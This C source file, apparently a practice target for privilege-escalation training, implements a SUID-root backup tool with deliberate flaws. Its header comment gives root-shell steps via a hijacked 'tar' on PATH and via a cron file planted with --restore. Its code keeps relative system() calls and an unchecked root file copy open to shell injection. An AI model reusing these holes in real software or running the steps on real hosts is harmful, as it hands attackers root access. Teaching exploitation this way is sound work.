/*
 * vault_backup - SUID root binary for Data Vault
 * 
 * VULNERABILITY: Uses system() with PATH-hijackable command 'tar'
 *                and also has a --restore flag that copies arbitrary files as root
 * 
 * Privesc via PATH hijack:
 *   1. echo '#!/bin/bash\nbash -p' > /tmp/tar && chmod +x /tmp/tar
 *   2. PATH=/tmp:$PATH vault_backup --create
 *   → spawns root shell
 * 
 * Privesc via --restore:
 *   vault_backup --restore /tmp/malicious.cron /etc/cron.d/pwned
 *   → copies attacker file into cron → root command execution
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BACKUP_DIR "/opt/vault/backups"

void create_backup() {
    printf("[*] Creating vault backup...\n");
    printf("[*] Archiving data directory...\n");
    // VULNERABLE: system() with relative command name - PATH hijackable
    system("tar czf " BACKUP_DIR "/vault_data.tar.gz -C /opt/vault/data .");
    printf("[+] Backup created: %s/vault_data.tar.gz\n", BACKUP_DIR);
}

void restore_backup(const char *src, const char *dst) {
    char cmd[512];
    printf("[*] Restoring: %s -> %s\n", src, dst);
    // VULNERABLE: arbitrary file copy as root
    snprintf(cmd, sizeof(cmd), "cp '%s' '%s'", src, dst);
    system(cmd);
    printf("[+] Restore complete\n");
}

void list_backups() {
    printf("[*] Available backups:\n");
    system("ls -la " BACKUP_DIR "/");
}

void show_help() {
    printf("Usage: vault_backup <option>\n");
    printf("  --create          Create a new backup\n");
    printf("  --list            List available backups\n");
    printf("  --restore <s> <d> Restore file from source to destination\n");
    printf("  --verify          Verify backup integrity\n");
    printf("  --help            Show this help\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        show_help();
        return 1;
    }

    if (strcmp(argv[1], "--create") == 0) {
        create_backup();
    } else if (strcmp(argv[1], "--list") == 0) {
        list_backups();
    } else if (strcmp(argv[1], "--restore") == 0) {
        if (argc < 4) {
            printf("Usage: vault_backup --restore <source> <destination>\n");
            return 1;
        }
        restore_backup(argv[2], argv[3]);
    } else if (strcmp(argv[1], "--verify") == 0) {
        printf("[*] Verifying backup integrity...\n");
        // VULNERABLE: also uses system() with tar
        system("tar tzf " BACKUP_DIR "/vault_data.tar.gz > /dev/null 2>&1 && echo '[+] Backup OK' || echo '[-] Backup corrupted'");
    } else if (strcmp(argv[1], "--help") == 0) {
        show_help();
    } else {
        printf("Unknown option: %s\n", argv[1]);
        show_help();
        return 1;
    }

    return 0;
}
